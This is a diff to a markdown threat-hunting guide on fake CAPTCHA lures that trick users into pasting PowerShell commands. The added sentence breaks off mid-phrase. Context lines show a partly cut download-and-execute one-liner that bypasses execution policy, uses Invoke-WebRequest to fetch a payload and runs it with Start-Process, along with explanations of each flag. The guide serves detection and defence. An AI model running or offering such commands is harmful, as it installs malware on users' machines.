@@ -1,7 +1,7 @@
 # Hypothesis-Driven Threat Hunt: Fake CAPTCHA Prompting Malicious PowerShell Execution
 
 ## Step 1: Define the Hypothesis
-Threat actors use fake CAPTCHA challenges to socially engineer victims into copying and executing malicious PowerShell commands, leading to initial access, malware execution, or system compromise. While credential stealers are the most commonly used, a threat actor could use this attack to execute ransomware or remote access trojans. 
+Threat actors use fake CAPTCHA challenges to socially engineer victims into copying and executing malicious PowerShell commands, leading to initial access, malware execution, or system compromise. While credential stealers are the most commonly used, a threat actor could use this attack to execute ransomware or remote access trojans. The Trojans are distributed through CAPTCHAs with instructions. Clicking the “I’m not a robot” button copies the line powershell.exe
 
 ## Step 2: Identify Data Sources
 To detect such activities, monitor:
@@ -76,3 +76,5 @@ powershell -ExecutionPolicy Bypass -Noprofile -Command "invoke-Webrequest -URL '
 - ```NoProfile:``` Prevents loading of the user profile, which speeds up the execution and avoids potential conflicts.
 - ```Invoke-WebRequest:``` Downloads the payload (payload.exe) from the provided URL.
 - ```Start-Process:``` Runs the downloaded malware.exe file.
+
+
